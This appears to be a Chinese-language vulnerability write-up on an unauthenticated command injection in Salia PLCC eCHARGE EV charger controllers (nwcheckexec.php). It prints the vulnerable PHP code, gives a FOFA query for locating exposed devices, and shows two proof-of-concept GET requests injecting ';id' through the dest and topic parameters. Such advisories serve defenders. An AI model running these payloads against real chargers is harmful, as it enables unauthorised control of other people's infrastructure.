---
title: "Salia PLCC nwcheckexec.php 命令执行漏洞"
source: https://mrxn.net/jswz/salia-nwcheckexec-dest-topic-rce.html
asset_dir: assets/salia-plcc-nwcheckexec.php-命令执行漏洞
---

# Salia PLCC nwcheckexec.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/25 08:18
- 808浏览
- [0评论](#comment)
- 29分钟阅读

---

# 漏洞简介

Salia PLCC 的 eCHARGE 系列提供适用于家庭、企业和公共场所的智能电动汽车充电解决方案，具备高效充电、动态负载管理和光伏系统集成等功能的充电站。其充电管理系统 `nwcheckexec.php` 存在命令执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，未授权攻击者可利用该漏洞在设备上[执行任意系统命令](https://mrxn.net/tag/rce)。

# 影响版本

<2.0.4 版本

漏洞修复方案

# fofa语法

> `"Salia PLCC"`

# 漏洞分析

看下 `nwcheckexec.php` 的业务逻辑实现，如下

```
<?php
    $dst = $_GET["dest"];
    $chk = $_GET["type"];
    $top = $_GET["topic"];
    $crt = $_GET["cert"];
    $cmd = '/srv/salia/nwcheck ';
    $x = "";

    if ($chk=="ping") {
       $x .= "=== PING ".$dst." ===".PHP_EOL;
       $cmd .= "-ping=".$dst;
    }
    if ($chk=="ntp") {
       $x .= "=== NTP ".$dst." ===".PHP_EOL;
       $cmd .= "-ntp=".$dst;
    }
    if ($chk=="dns") {
       $x .= "=== DNS RESOLVE ".$dst." ===".PHP_EOL;
       $cmd .= "-dns=".$dst;
    }
    if ($chk=="mqtt") {
       $x .= "=== MQTT ".$dst." ===".PHP_EOL;
       $x .= "topic: ".$top.PHP_EOL;
       $cmd .= "-mqtt=".$dst."::".$top;
    }
    if ($chk=="http") {
       $x .= "=== HTTP(S) ".$dst." ===".PHP_EOL;
       if (substr($dst,0,7)<>"http://" and substr($dst,0,8)<>"https://") {
          $dst = "http://".$dst;
       }
       $y = "";
       if ($crt=="false")
          $y = "-http=".$dst;
       else
          $y = "-https=".$dst;
       $cmd .= trim($y);
    }
    if ($chk=="neigh") {
       $x .= "=== IP NEIGH ===".PHP_EOL;
       $spl = shell_exec("ip neigh");
       $s = explode("\n", $spl);
       foreach ($s as $l) {
          if (trim($l)<>"") {
          if (strpos($l, " 00:01:87"))
             $x .= $l." ---- (Salia)".PHP_EOL;
          else if (strpos($l, " 00:D0:93"))
             $x .= $l." ---- (eCB1)".PHP_EOL;
          else
             $x .= $l.PHP_EOL;
          }
       }
       //$x .= shell_exec("ip neigh");
    } else {
       $res = shell_exec($cmd);
       if ($chk=="http") {
          $spl = str_split(strip_tags($res), 110);
          $rr = "";
          $xr = "";
          foreach ($spl as $txt)
             $rr .= $txt.PHP_EOL;
          for ($i=0;$i<100;$i++)
             $rr = str_replace("  "," ",$rr);
          $ar = explode("\n", $rr);
          foreach ($ar as $l) {
             if (trim($l)<>"")
             $xr .= trim($l);
          }
          $xxx = str_split($xr, 110);
          foreach ($xxx as $txt)
             $x .= $txt.PHP_EOL;
          //$x .= $rr;
       } else {
          $x .= $res;
       }
    }
    //$x .= $cmd;
    echo $x;
?>
```

`$cmd` 变量拼接了用户传入的 `$dst` 和 `$top` 参数，且直接传入 `shell_exec()` 执行。

根据 `$chk` 参数的不同值，拼接不同的命令参数，最终[执行任意系统命令](https://mrxn.net/tag/rce)，期间无任何过滤，造成命令注入漏洞。

网络安全

修复后的版本 增加了 `escapeshellarg` 方法对传入参数进行过滤。

[![Salia PLCC nwcheckexec.php 命令执行漏洞](images/img-001-70addc1c8655.webp)](https://image.mrxn.net/f488f0f314044ddea58894adaaf0abe5.webp)

# 漏洞复现

## `type=ping`

```
GET /nwcheckexec.php?type=ping&dest=8.8.8.8;id HTTP/1.1
Host: salia.mrxn.net
```

成功获得 `id` 命令执行结果

漏洞修复方案

[![Salia PLCC nwcheckexec.php 命令执行漏洞](images/img-002-157bc4e3f560.webp)](https://image.mrxn.net/80fa4e11f142479f8d3ea1230896551c.webp)

## `type=mqtt`

```
GET /nwcheckexec.php?type=mqtt&dest=127.0.0.1&topic=topicname;id HTTP/1.1
Host: salia.mrxn.net
```

成功获得 `id` 命令执行结果

代码安全审计

[![Salia PLCC nwcheckexec.php 命令执行漏洞](images/img-003-e470b9aac1f2.webp)](https://image.mrxn.net/33cd1696cda94bbab8bc3451e9700216.webp)

# 参考

- `https://www.onekey.com/resource/critical-vulnerabilities-in-ev-charging-stations-analysis-of-echarge-controllers`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.type=ping](#toc-5-1-)
- [5.2.type=mqtt](#toc-5-2-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
